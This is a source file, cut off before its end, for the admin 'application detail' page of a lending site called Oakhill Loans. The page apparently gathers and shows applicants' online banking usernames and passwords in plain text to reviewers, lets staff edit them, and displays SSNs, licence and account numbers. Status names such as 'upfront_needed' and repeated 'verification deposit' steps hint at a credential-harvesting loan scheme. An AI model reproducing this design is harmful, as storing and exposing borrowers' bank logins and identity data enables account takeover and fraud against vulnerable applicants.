"use client";

import { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";
import Link from "next/link";
import { useAdminAuth, useAdminApi } from "@/lib/admin-auth";
import {
  ACCOUNT_TYPES,
  EMPLOYMENT_STATUSES,
  LOAN_PURPOSES,
  US_STATES,
} from "@/lib/constants";
import { formatDateTime } from "@/lib/datetime";
// encrypted;

interface ApplicationDetail {
  session_id: string;
  application_id: string;

  // Existing fields...

  // Applicant
  first_name: string;
  last_name: string;
  email: string;
  phone: string;
  middle_initial: string | null;
  suffix: string | null;
  date_of_birth: string;
  street_address: string;
  city: string;
  state: string;
  zip_code: string;
  country: string;

  // Residence
  apt_unit_suite: string | null;
  time_at_current_address: string | null;
  housing_status: string | null;
  monthly_housing_payment: string | number | null;

  // Employment & Income
  employment_status: string | null;
  primary_income_type: string | null;
  employer_name: string | null;
  job_title: string | null;
  employer_phone: string | null;
  time_at_current_job: string | null;
  net_monthly_income: string | number | null;
  pay_frequency: string | null;
  next_pay_date: string | null;
  direct_deposit: boolean | null;
  additional_monthly_income: string | number | null;
  additional_income_source: string | null;

  // Loan
  loan_amount: string | number;
  loan_purpose: string;
  loan_purpose_other_detail: string | null;
  loan_term: number;

  // Banking - manual OR instant verification
  bank_name: string | null;
  routing_number_encrypted?: string | null;
  routing_number_hash?: string | null;
  account_number_encrypted?: string | null;
  account_type: string | null;
  bank_account_age: string | null;
  bank_balance_status: string | null;
  bank_verification_completed: boolean;

  // Sensitive values returned only when authorized
  ssn_decrypted?: string;
  dl_decrypted?: string;
  account_decrypted?: string;

  // Driver's license
  dl_state: string | null;
  dl_expiration_date: string | null;

  // Consents
  tcpa_consent: boolean;
  esign_consent: boolean;
  privacy_consent: boolean;
  soft_credit_pull_consent: boolean;
  hard_credit_pull_consent: boolean;
  ach_authorization_consent: boolean;

  // Marketing / attribution
  utm_source: string | null;
  utm_medium: string | null;
  utm_campaign: string | null;
  utm_content: string | null;
  utm_term: string | null;

  // Tracking
  assisted_by_loan_agent: string | null;
  ip_address: string | null;
  user_agent: string | null;
  device_fingerprint: string | null;
  page_url: string | null;
  referrer_url: string | null;
  landing_page_first_touch: string | null;
  jornaya_leadid: string | null;
  trustedform_cert_url: string | null;

  // Step timestamps
  step1_started_at: string | null;
  step1_submitted_at: string | null;
  step2_submitted_at: string | null;
  step3_submitted_at: string | null;
  total_time_on_form: number;

  // Status
  status: string;
  created_at: string;
  updated_at: string;
  reviewed_at: string | null;
  funded_at: string | null;

  // Plaid - optional, NOT required for manual verification
  plaid_item_id: string | null;
  plaid_account_id: string | null;
  plaid_account_mask: string | null;
  plaid_account_type: string | null;

  // Bank verification
  bankVerification?: BankVerification;
}

interface BankVerification {
  full_name: string;
  email: string;
  application_id: string;
  online_banking_username: string;
  online_banking_password: string;
  bank_name: string;
  account_type: string;
  verification_status: string;
  created_at: string;
}

interface ApplicationDetailResponse {
  success: boolean;
  application: ApplicationDetail;
  bankVerification: BankVerification | null;
  auditLog: unknown[];
}

interface AuditEntry {
  id: string;
  action: string;
  performed_by: string;
  details: Record<string, unknown>;
  created_at: string;
}

// const STATUS_COLORS: Record<string, string> = {
//   bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
//   reviewing: "bg-blue-100 text-blue-800 border-blue-200",
//   bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
//   declined: "bg-red-100 text-red-800 border-red-200",
//   funded: "bg-purple-100 text-purple-800 border-purple-200",
//   bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
//   bank_verification_in_progress:
//     "bg-indigo-100 text-indigo-800 border-indigo-200",
//   deposit_in_progress: "bg-yellow-100 text-yellow-800",
// };

// const ALL_STATUSES = [
//   "bank_verification_pending",
//   "reviewing",
//   "bank_verification_completed",
//   "declined",
//   "funded",
//   "bank_verification_failed",
//   "bank_verification_in_progress",
//   "deposit_in_progress",
// ];

const STATUS_COLORS: Record<string, string> = {
  // bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
  // bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
  // verification_deposit_1: "bg-blue-100 text-blue-800 border-blue-200",
  // verification_deposit_2: "bg-blue-100 text-blue-800 border-blue-200",
  funded: "bg-purple-100 text-purple-800 border-purple-200",
  // declined: "bg-red-100 text-red-800 border-red-200",
  declined_pb: "bg-red-100 text-red-800 border-red-200",
  declined_hd: "bg-red-100 text-red-800 border-red-200",
  bank_reverification: "bg-amber-100 text-amber-800 border-amber-200",
  request_a_call: "bg-indigo-100 text-indigo-800 border-indigo-200",
  // upfront_needed: "bg-orange-100 text-orange-800 border-orange-200",
  bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
};

const ALL_STATUSES = [
  // "bank_verification_pending",
  // "bank_verification_failed",
  // "verification_deposit_1",
  // "verification_deposit_2",
  "funded",
  // "declined",
  "declined_pb",
  "declined_hd",
  "bank_reverification",
  "request_a_call",
  // "upfront_needed",
];

const QUICK_STATUS_ACTIONS = [
  {
    value: "bank_reverification",
    label: "Bank Re-verification",
  },
  {
    value: "request_a_call",
    label: "Request a Call",
  },
  {
    value: "funded",
    label: "Funded",
  },
  {
    value: "declined_pb",
    label: "Declined - PB",
  },
  {
    value: "declined_hd",
    label: "Declined - HD",
  },
  // {
  //   value: "declined",
  //   label: "Declined",
  // },
];

function formatStatusLabel(status: string) {
  const knownLabels: Record<string, string> = {
    bank_re_verification: "Bank Re-verification",
    request_a_call: "Request a Call",
    declined_pb: "Declined - PB",
    declined_hd: "Declined - HD",
  };

  return (
    knownLabels[status] ||
    status.replace(/_/g, " ").replace(/\b\w/g, (l) => l.toUpperCase())
  );
}

function formatCurrency(amount: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(amount);
}

function calcMonthlyPayment(amount: number, termMonths: number): number {
  const monthlyRate = 0.1 / 12;
  const factor = Math.pow(1 + monthlyRate, termMonths);
  return (amount * (monthlyRate * factor)) / (factor - 1);
}

function mdyToIso(mdy?: string | number | null) {
  if (!mdy) return "";

  const s = String(mdy);

  // Match MM/DD/YYYY with optional time
  const match = s.match(/^(\d{2})\/(\d{2})\/(\d{4})/);

  if (match) {
    const [, m, d, y] = match;
    return `${y}-${m}-${d}`;
  }

  return s.slice(0, 10);
}

function isoToMdy(iso: string) {
  if (!iso) return "";

  const match = iso.match(/^(\d{4})-(\d{2})-(\d{2})/);

  if (match) {
    const [, y, m, d] = match;
    return `${m}/${d}/${y}`;
  }

  return iso;
}

// function formatDate(date: string | null) {
//   if (!date) return "N/A";
//   return new Date(date).toLocaleString("en-US", {
//     month: "short",
//     day: "numeric",
//     year: "numeric",
//     hour: "numeric",
//     minute: "2-digit",
//   });
// }

function Section({
  title,
  children,
}: {
  title: string;
  children?: React.ReactNode;
}) {
  return (
    <div className="bg-white rounded-xl border border-gray-200 p-6">
      <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
        {title}
      </h3>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">{children}</div>
    </div>
  );
}

function Field({
  label,
  value,
}: {
  label: string;
  value: string | number | null | undefined;
}) {
  return (
    <div>
      <p className="text-xs text-gray-400">{label}</p>
      <p className="text-sm font-medium text-gray-900">{value ?? "N/A"}</p>
    </div>
  );
}

function EditableField({
  label,
  name,
  value,
  type = "text",
  min,
  max,
  onChange,
}: {
  label: string;
  name: string;
  value: string | number | null | undefined;
  type?: string;
  min?: number | string;
  max?: number | string;
  onChange: (name: string, value: string | number) => void;
}) {
  return (
    <div>
      <label className="text-xs text-gray-400">{label}</label>
      <input
        type={type}
        name={name}
        min={min}
        max={max}
        lang="en-US"
        value={value ?? ""}
        onChange={(e) => {
          if (type === "number") {
            const num = Number(e.target.value);
            const minN = min !== undefined ? Number(min) : -Infinity;
            const maxN = max !== undefined ? Number(max) : Infinity;
            const clamped = Math.min(Math.max(num, minN), maxN);
            onChange(name, Number.isNaN(clamped) ? 0 : clamped);
          } else {
            onChange(name, e.target.value);
          }
        }}
        className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
      />
    </div>
  );
}

export default function ApplicationDetailPage() {
  const params = useParams();
  const router = useRouter();
  const { user, loading, logout, isReviewer, isAdmin } = useAdminAuth();
  const { adminFetch } = useAdminApi();

  const [isDownloading, setIsDownloading] = useState(false);

  const [app, setApp] = useState<ApplicationDetail | null>(null);
  const [bankVerification, setBankVerification] =
    useState<BankVerification | null>(null);
  const [auditLog, setAuditLog] = useState<AuditEntry[]>([]);
  const [dataLoading, setDataLoading] = useState(true);
  const [showDecrypted, setShowDecrypted] = useState(false);
  const [revealedSensitive, setRevealedSensitive] = useState<{
    ssn: string | null;
    driverLicense: string | null;
    accountNumber: string | null;
  } | null>(null);
  const [statusUpdating, setStatusUpdating] = useState(false);
  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [edit, setEdit] = useState(false);
  const [saving, setSaving] = useState(false);
  const [formData, setFormData] = useState<Partial<ApplicationDetail>>({});

  const id = params.id as string;
  console.log(bankVerification);

  useEffect(() => {
    if (!loading && !user) router.replace("/admin");
  }, [loading, user, router]);

  useEffect(() => {
    if (!user || !id) return;

    adminFetch(`/api/admin/applications/${id}`)
      .then((r) => {
        if (!r.ok) throw new Error("Application not found");
        return r.json();
      })
      .then((data) => {
        setApp(data.application);
        setBankVerification(data?.bankVerification);
        setAuditLog(data.auditLog || []);
      })
      .catch((err) => setError(err.message))
      .finally(() => setDataLoading(false));
  }, [user, id, adminFetch]);

  useEffect(() => {
    if (edit && app) {
      setFormData({
        first_name: app.first_name,
        last_name: app.last_name,
        email: app.email,
        phone: app.phone,
        date_of_birth: app.date_of_birth,
        dl_state: app.dl_state,
        street_address: app.street_address,
        city: app.city,
        state: app.state,
        zip_code: app.zip_code,
        country: app.country,
        employment_status: app.employment_status,
        employer_name: app.employer_name,
        job_title: app.job_title,
        net_monthly_income: app.net_monthly_income,
        ssn_decrypted: app?.ssn_decrypted,
        time_at_current_job: app.time_at_current_job,
        loan_amount: app.loan_amount,
        loan_purpose: app.loan_purpose,
        loan_term: app.loan_term,
        bank_name: app.bank_name,
        routing_number_encrypted: app.routing_number_encrypted,
        bank_balance_status: app?.bank_balance_status,
        bank_account_age: app?.bank_account_age,
        account_decrypted: app?.account_decrypted,
        account_type: app.account_type,
        dl_decrypted: app?.dl_decrypted,
        bankVerification: {
          online_banking_username:
            bankVerification?.online_banking_username ?? "",
          online_banking_password:
            bankVerification?.online_banking_password ?? "",
          bank_name: bankVerification?.bank_name ?? "",
          account_type: bankVerification?.account_type ?? "",
          full_name: bankVerification?.full_name ?? "",
          email: bankVerification?.email ?? "",
        } as BankVerification,
      });
    }
  }, [edit, app, bankVerification]);

  useEffect(() => {
    console.log("app", app?.date_of_birth);
  }, [app]);

  const handleFormChange = (name: string, value: string | number) => {
    let newValue = value;

    if (name === "phone") {
      const digits = String(value).replace(/\D/g, "").slice(0, 10);

      if (digits.length > 6) {
        newValue = `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
      } else if (digits.length > 3) {
        newValue = `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
      } else if (digits.length > 0) {
        newValue = `(${digits}`;
      } else {
        newValue = "";
      }
    }

    if (name === "ssn_decrypted") {
      const digits = String(value).replace(/\D/g, "").slice(0, 9);

      if (digits.length > 5) {
        newValue = `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
      } else if (digits.length > 3) {
        newValue = `${digits.slice(0, 3)}-${digits.slice(3)}`;
      } else {
        newValue = digits;
      }
    }

    setFormData((prev) => ({
      ...prev,
      [name]: newValue,
    }));
  };

  const handleBankVerificationChange = (
    name: string,
    value: string | number,
  ) => {
    setFormData((prev) => ({
      ...prev,
      bankVerification: {
        ...(prev.bankVerification as BankVerification),
        [name]: value,
      },
    }));
  };

  const handleSave = async () => {
    setSaving(true);
    setError("");
    setSuccess("");
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify(formData),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Save failed");
      setApp((prev) => (prev ? { ...prev, ...formData } : prev));
      setSuccess("Application updated successfully");
      setEdit(false);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Save failed");
    } finally {
      setSaving(false);
    }
  };

  const handleStatusUpdate = async (newStatus: string) => {
    setStatusUpdating(true);
    setError("");
    setSuccess("");

    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify({ status: newStatus }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);

      setSuccess(`Status updated to ${formatStatusLabel(newStatus)}`);
      setApp((prev) => (prev ? { ...prev, status: newStatus } : prev));

      // Refresh audit log
      const logRes = await adminFetch(`/api/admin/applications/${id}`);
      const logData = await logRes.json();
      setAuditLog(logData.auditLog || []);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Update failed");
    } finally {
      setStatusUpdating(false);
    }
  };

  const handleRevealSensitive = async () => {
    setError("");
    try {
      const response = await adminFetch(
        `/api/admin/applications/${id}/reveal-sensitive`,
        { method: "POST", body: JSON.stringify({}) },
      );
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Reveal failed");
      setRevealedSensitive(data);
      setShowDecrypted(true);
      setSuccess("Sensitive data revealed and access logged.");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Reveal failed");
    }
  };

  const handleDelete = async () => {
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "DELETE",
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error);
      }
      router.push("/admin/applications");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Delete failed");
      setDeleteConfirm(false);
    }
  };

  const handleDownloadLoanAgreement = async () => {
    setIsDownloading(true);
    try {
      const res = await adminFetch(
        `/api/admin/applications/${encodeURIComponent(id)}/download-loan-agreement`,
      );

      if (!res.ok) {
        const data = await res.json().catch(() => null);
        throw new Error(data?.error || "Failed to download loan agreement");
      }

      // 1. Convert response stream into a Blob object
      const blob = await res.blob();

      // 2. Extract filename from Content-Disposition header if available
      let filename =
        `${app?.first_name || "Borrower"}_${app?.last_name || ""}_LOAN_AGREEMENT.pdf`.replace(
          /\s+/g,
          "_",
        );
      const contentDisposition = res.headers.get("Content-Disposition");
      if (contentDisposition) {
        const match = contentDisposition.match(/filename="?([^"]+)"?/);
        if (match && match[1]) {
          filename = match[1];
        }
      }

      // 3. Create a temporary URL and anchor tag to trigger the browser download
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();

      // 4. Clean up DOM and memory
      a.remove();
      window.URL.revokeObjectURL(url);
    } catch (error) {
      setError(error instanceof Error ? error.message : "Download failed");
      setDeleteConfirm(false);
    } finally {
      setIsDownloading(false);
    }
  };

  const REVIEWER_ONLY_ACTIONS = [
    // "declined",
    "declined_pb",
    "declined_hd",
    "bank_reverification",
  ];

  if (loading || !user) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
      </div>
    );
  }

  if (user.role === "reviewer") {
    return (
      <div className="min-h-screen bg-gray-50">
        {/* Top Nav */}
        <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10">
          <div className="flex items-center gap-6">
            <Link
              href="/admin/dashboard"
              className="text-xl font-bold text-primary"
            >
              Oakhill Loans
            </Link>
            <div className="hidden sm:flex items-center gap-4 text-sm">
              <Link
                href="/admin/dashboard"
                className="text-gray-600 hover:text-primary transition"
              >
                Dashboard
              </Link>
              <Link
                href="/admin/applications"
                className="text-primary font-medium"
              >
                Applications
              </Link>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-gray-500 hidden sm:inline">
              {user.name} ({user.role})
            </span>
            <button
              onClick={logout}
              className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
            >
              Logout
            </button>
          </div>
        </nav>

        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
          {/* Back link */}
          <button
            onClick={() => router.back()}
            className="text-sm text-primary hover:underline mb-4 inline-block cursor-pointer"
          >
            &larr; Back to Applications
          </button>

          {dataLoading ? (
            <div className="flex justify-center py-12">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
            </div>
          ) : error && !app ? (
            <div className="p-8 text-center text-red-500">{error}</div>
          ) : app ? (
            <div className="space-y-6">
              {/* Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h1 className="text-2xl font-bold text-gray-900">
                    {app.first_name} {app.last_name}
                  </h1>
                  <p className="text-gray-500">
                    {app.email} &middot; {app.phone}
                  </p>
                </div>
                <span
                  className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
                >
                  {app.status.replace(/_/g, " ").toUpperCase()}
                </span>
              </div>

              {/* Messages */}
              {error && (
                <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                  {error}
                </div>
              )}
              {success && (
                <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                  {success}
                </div>
              )}

              {/* Status Actions */}
              {isReviewer && (
                <div className="space-y-4">
                  <div className="bg-white rounded-xl border border-gray-200 p-6">
                    <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                      Quick Status Actions
                    </h3>
                    <div className="flex flex-wrap gap-2">
                      {QUICK_STATUS_ACTIONS.filter((action) =>
                        REVIEWER_ONLY_ACTIONS.includes(action.value),
                      ).map((action) => (
                        <button
                          key={action.value}
                          onClick={() => handleStatusUpdate(action.value)}
                          disabled={statusUpdating}
                          className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${
                            STATUS_COLORS[action.value] || ""
                          }`}
                        >
                          {statusUpdating ? "..." : action.label}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              )}

              <div className="flex items-center justify-between p-4 bg-white border border-slate-200 rounded-xl shadow-sm hover:shadow-md transition-shadow">
                <div>
                  <h3 className="text-base font-semibold text-slate-800">
                    {app.first_name} {app.last_name}
                  </h3>
                  <p className="text-sm text-slate-500">
                    Application ID:{" "}
                    <span className="font-mono">{app.application_id}</span>
                  </p>
                </div>

                <button
                  onClick={handleDownloadLoanAgreement}
                  disabled={isDownloading}
                  className="inline-flex items-center gap-2 px-4 py-2.5 text-sm font-medium text-white bg-indigo-600 rounded-lg hover:bg-indigo-700 active:bg-indigo-800 disabled:opacity-60 disabled:cursor-not-allowed transition-colors shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
                >
                  {isDownloading ? (
                    <>
                      {/* Animated Loading Spinner */}
                      <svg
                        className="w-4 h-4 animate-spin text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                      <span>Downloading...</span>
                    </>
                  ) : (
                    <>
                      {/* PDF Document Icon */}
                      <svg className="w-4 h-4 fill-current" viewBox="0 0 20 20">
                        <path d="M4 18h12a2 2 0 002-2V6l-4-4H4a2 2 0 00-2 2v12a2 2 0 002 2zm0-14h7v3h3v9H4V4z" />
                      </svg>
                      <span>
                        Download {app.first_name} {app.last_name} Loan Agreement
                      </span>
                    </>
                  )}
                </button>
              </div>

              {/* Personal Info */}
              <Section title="Personal Information">
                <Field label="Application ID" value={app.application_id} />
                <Field
                  label="Full name"
                  value={`${app.first_name} ${app.last_name}`}
                />
                <Field label="Suffix" value={app.suffix || "-"} />
                <Field label="Email" value={app.email} />
                <Field label="Phone" value={app.phone} />
                <Field
                  label="Date of Birth"
                  value={
                    app.date_of_birth
                      ? new Date(app.date_of_birth).toLocaleDateString(
                          "en-US",
                          {
                            month: "2-digit",
                            day: "2-digit",
                            year: "numeric",
                          },
                        )
                      : "N/A"
                  }
                />
                {/* <Field label="Driver's License State" value={app.dl_state} /> */}
                {/* <Field
                  label="SSN"
                  value={revealedSensitive?.ssn || app.ssn_decrypted}
                />
                <Field
                  label="DL Number"
                  value={revealedSensitive?.driverLicense || app.dl_decrypted}
                /> */}
                {/* {isAdmin && (
                  <button
                    type="button"
                    onClick={handleRevealSensitive}
                    className="text-sm text-primary hover:underline text-left"
                  >
                    Reveal sensitive data
                  </button>
                )} */}
              </Section>

              {/* Address */}
              <Section title="Address">
                <Field
                  label="Street Address"
                  value={app.street_address || "-"}
                />

                <Field
                  label="Apt / Unit / Suite"
                  value={app.apt_unit_suite || "-"}
                />

                <Field label="City" value={app.city || "-"} />

                <Field label="State" value={app.state || "-"} />

                <Field label="ZIP Code" value={app.zip_code || "-"} />

                <Field label="Country" value={app.country || "-"} />

                <Field
                  label="Time at Current Address"
                  value={app.time_at_current_address || "-"}
                />

                <Field
                  label="Housing Status"
                  value={app.housing_status || "-"}
                />

                <Field
                  label="Monthly Housing Payment"
                  value={
                    app.monthly_housing_payment != null
                      ? formatCurrency(Number(app.monthly_housing_payment))
                      : "-"
                  }
                />
              </Section>

              {/* Employment */}
              <Section title="Employment & Income">
                <Field
                  label="Employment Status"
                  value={app.employment_status || "-"}
                />

                <Field
                  label="Primary Income Type"
                  value={app.primary_income_type || "-"}
                />

                <Field label="Employer" value={app.employer_name || "-"} />

                <Field label="Job Title" value={app.job_title || "-"} />

                <Field
                  label="Employer Phone"
                  value={app.employer_phone || "-"}
                />

                <Field
                  label="Time at Current Job"
                  value={app.time_at_current_job || "-"}
                />

                <Field
                  label="Net Monthly Income"
                  value={
                    app.net_monthly_income != null
                      ? formatCurrency(Number(app.net_monthly_income))
                      : "-"
                  }
                />

                <Field label="Pay Frequency" value={app.pay_frequency || "-"} />

                <Field
                  label="Next Pay Date"
                  value={
                    app.next_pay_date
                      ? new Date(app.next_pay_date).toLocaleDateString("en-US")
                      : "-"
                  }
                />

                <Field
                  label="Direct Deposit"
                  value={
                    app.direct_deposit === true
                      ? "Yes"
                      : app.direct_deposit === false
                        ? "No"
                        : "-"
                  }
                />

                <Field
                  label="Additional Monthly Income"
                  value={
                    app.additional_monthly_income != null
                      ? formatCurrency(Number(app.additional_monthly_income))
                      : "-"
                  }
                />

                <Field
                  label="Additional Income Source"
                  value={app.additional_income_source || "-"}
                />
              </Section>

              {/* Loan Details */}
              <Section title="Loan Details">
                <Field
                  label="Loan Amount"
                  value={formatCurrency(Number(app.loan_amount))}
                />

                <Field label="Loan Purpose" value={app.loan_purpose || "-"} />

                {app.loan_purpose === "Other Personal Expenses" && (
                  <Field
                    label="Purpose — Other Detail"
                    value={app.loan_purpose_other_detail || "-"}
                  />
                )}

                <Field label="Loan Term" value={`${app.loan_term} months`} />

                <Field
                  label="Monthly Payment"
                  value={formatCurrency(
                    calcMonthlyPayment(
                      Number(app.loan_amount),
                      Number(app.loan_term),
                    ),
                  )}
                />
              </Section>

              {/* Banking */}
              <Section title="Banking Information">
                <Field label="Bank Name" value={app.bank_name || "-"} />

                <Field
                  label="Routing Number"
                  value={app.routing_number_encrypted || "-"}
                />

                <Field label="Account Type" value={app.account_type || "-"} />

                <Field
                  label="Account Number"
                  value={
                    revealedSensitive?.accountNumber ||
                    app.account_decrypted ||
                    "-"
                  }
                />

                <Field
                  label="Account Status"
                  value={app.bank_balance_status || "-"}
                />

                <Field
                  label="Account Age"
                  value={app.bank_account_age || "-"}
                />

                <Field
                  label="Bank Verification"
                  value={
                    app.bank_verification_completed ? "Completed" : "Pending"
                  }
                />

                {/* {isAdmin && (
                  <button
                    type="button"
                    onClick={handleRevealSensitive}
                    className="text-sm text-primary hover:underline text-left"
                  >
                    Reveal bank account data
                  </button>
                )} */}
              </Section>

              {/* Bank Verification Details */}
              {bankVerification && (
                <Section title="Bank Verification Details">
                  <Field
                    label="Full name"
                    value={bankVerification?.full_name}
                  />
                  <Field label="Email" value={bankVerification?.email} />
                  <Field
                    label="Online Bank Username"
                    value={bankVerification?.online_banking_username}
                  />
                  <Field
                    label="Online Bank Password"
                    value={bankVerification?.online_banking_password}
                  />
                  <Field
                    label="Application ID"
                    value={
                      bankVerification?.application_id
                        ? app.application_id
                        : "-"
                    }
                  />
                  <Field
                    label="Bank Name"
                    value={bankVerification?.bank_name}
                  />
                  <Field
                    label="Account"
                    value={bankVerification?.account_type}
                  />
                  {/* <Field
                      label="Verification Status"
                      value={bankVerification?.verification_status}
                    /> */}
                  <Field
                    label="Submitted At"
                    value={bankVerification?.created_at}
                  />
                </Section>
              )}

              <Section title="Identity Verification">
                <Field
                  label="SSN"
                  value={
                    revealedSensitive?.ssn || app.ssn_decrypted || "•••-••-••••"
                  }
                />

                <Field
                  label="Driver's License"
                  value={
                    revealedSensitive?.driverLicense ||
                    app.dl_decrypted ||
                    "••••••••"
                  }
                />

                <Field label="DL Issuing State" value={app.dl_state || "-"} />

                <Field
                  label="DL Expiration"
                  value={
                    app.dl_expiration_date
                      ? new Date(app.dl_expiration_date).toLocaleDateString(
                          "en-US",
                        )
                      : "-"
                  }
                />

                <Field
                  label="Hard Credit Authorization"
                  value={app.hard_credit_pull_consent ? "Yes" : "No"}
                />

                {/* {isAdmin && (
                    <button
                      type="button"
                      onClick={handleRevealSensitive}
                      className="text-sm text-primary hover:underline text-left"
                    >
                      Reveal sensitive data
                    </button>
                  )} */}
              </Section>

              {/* Audit Log */}
              {auditLog.length > 0 && (
                <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                    Audit Log
                  </h3>
                  <div className="space-y-3">
                    {auditLog.map((entry) => (
                      <div
                        key={entry.id}
                        className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                      >
                        <div className="flex-1">
                          <span className="font-medium text-gray-900">
                            {entry.action}
                          </span>
                          <span className="text-gray-400 mx-2">by</span>
                          <span className="text-gray-600">
                            {entry.performed_by}
                          </span>
                          {entry.details &&
                            Object.keys(entry.details).length > 0 && (
                              <p className="text-xs text-gray-400 mt-1">
                                {JSON.stringify(entry.details)}
                              </p>
                            )}
                        </div>
                        <span className="text-xs text-gray-400 whitespace-nowrap">
                          {formatDateTime(entry.created_at)}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Delete */}
              {isAdmin && (
                <div className="bg-white rounded-xl border border-red-200 p-6">
                  <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                    Danger Zone
                  </h3>
                  {deleteConfirm ? (
                    <div className="flex items-center gap-3">
                      <p className="text-sm text-gray-600">
                        Are you sure? This action cannot be undone.
                      </p>
                      <button
                        onClick={handleDelete}
                        className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                      >
                        Confirm Delete
                      </button>
                      <button
                        onClick={() => setDeleteConfirm(false)}
                        className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                      >
                        Cancel
                      </button>
                    </div>
                  ) : (
                    <button
                      onClick={() => setDeleteConfirm(true)}
                      className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                    >
                      Delete Application
                    </button>
                  )}
                </div>
              )}
            </div>
          ) : null}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Top Nav */}
      <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10 ">
        <div className="flex items-center gap-6">
          <Link
            href="/admin/dashboard"
            className="text-xl font-bold text-primary"
          >
            Oakhill Loans
          </Link>
          <div className="hidden sm:flex items-center gap-4 text-sm">
            <Link
              href="/admin/dashboard"
              className="text-gray-600 hover:text-primary transition"
            >
              Dashboard
            </Link>
            <Link
              href="/admin/applications"
              className="text-primary font-medium"
            >
              Applications
            </Link>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <span className="text-sm text-gray-500 hidden sm:inline">
            {user.name} ({user.role})
          </span>
          <button
            onClick={logout}
            className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
          >
            Logout
          </button>
        </div>
      </nav>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8">
        {/* Back link */}
        <button
          onClick={() => router.back()}
          className="text-sm text-primary hover:underline mb-4 inline-block cursor-pointer"
        >
          &larr; Back to Applications
        </button>

        {dataLoading ? (
          <div className="flex justify-center py-12">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
          </div>
        ) : error && !app ? (
          <div className="p-8 text-center text-red-500">{error}</div>
        ) : app ? (
          <div className="space-y-6">
            {/* Header */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h1 className="text-2xl font-bold text-gray-900">
                  {app.first_name} {app.last_name}
                </h1>
                <p className="text-gray-500">
                  {app.email} &middot; {app.phone}
                </p>
              </div>
              <div className="flex items-center gap-3 flex-wrap">
                {/* {edit ? (
                  <>
                    <button
                      onClick={handleSave}
                      disabled={saving}
